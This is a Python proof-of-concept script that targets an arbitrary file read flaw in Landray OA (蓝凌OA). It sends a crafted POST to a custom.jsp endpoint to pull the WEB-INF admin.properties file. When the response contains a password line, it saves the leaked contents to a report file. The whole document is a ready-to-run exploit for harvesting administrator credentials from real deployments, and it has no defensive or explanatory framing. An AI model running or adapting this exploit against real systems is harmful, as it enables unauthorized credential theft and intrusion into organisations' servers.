import requests
import time
import buter
import wirtefile

filename = "./reps/蓝凌OA任意文件读取-"+str(time.strftime("%Y-%m-%d", time.localtime()))
headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
poc = "/sys/ui/extend/varkind/custom.jsp"

data = 'var=%7B%22body%22%3A%7B%22file%22%3A%22%2FWEB-INF%2FKmssConfig%2Fadmin.properties%22%7D%7D'
def lanoaanyfileread(url):
    try:
        rep = requests.post(url=url+poc, headers=headers, data=data, timeout=10)
        if rep.status_code == 200 and 'password =' in rep.text:
            print(buter.colors.GREEN+  f"存在蓝凌OA任意文件读取 url : {url}" + buter.colors.END)
            reptext = f"{url}{rep.text}"
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现蓝凌OA任意文件读取 url : {url} " + buter.colors.END)
    except Exception as e:
        print(buter.colors.END+f"ERROR : {e}"+buter.colors.END)
